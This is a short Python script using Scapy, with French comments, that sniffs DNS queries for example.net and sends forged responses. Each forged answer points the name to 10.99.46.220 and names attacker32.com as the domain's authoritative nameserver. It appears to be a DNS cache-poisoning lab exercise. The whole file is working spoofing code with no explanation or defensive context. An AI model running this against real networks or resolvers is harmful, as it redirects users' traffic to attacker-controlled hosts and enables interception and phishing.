#!/usr/bin/python
from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and 'example.net' in pkt[DNS].qd.qname.decode()):

        # Inverser src et dst
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

        # Answer Section
        Anssec = DNSRR(
            rrname=pkt[DNS].qd.qname,
            type='A',
            ttl=259200,
            rdata='10.99.46.220'
        )

        # Authority Section → remplacer NS par attacker32.com
        NSsec = DNSRR(
            rrname='example.net',
            type='NS',
            ttl=259200,
            rdata='attacker32.com'
        )

        # Construire le paquet DNS
        DNSpkt = DNS(
            id=pkt[DNS].id,
            qd=pkt[DNS].qd,
            aa=1, rd=0, qr=1,
            qdcount=1,
            ancount=1,
            nscount=1,
            arcount=0,
            an=Anssec,
            ns=NSsec
        )

        # Envoyer le paquet
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
        print("Paquet spoofé envoyé !")

# Écouter les requêtes DNS
pkt = sniff(
    filter='udp and dst port 53',
    prn=spoof_dns
)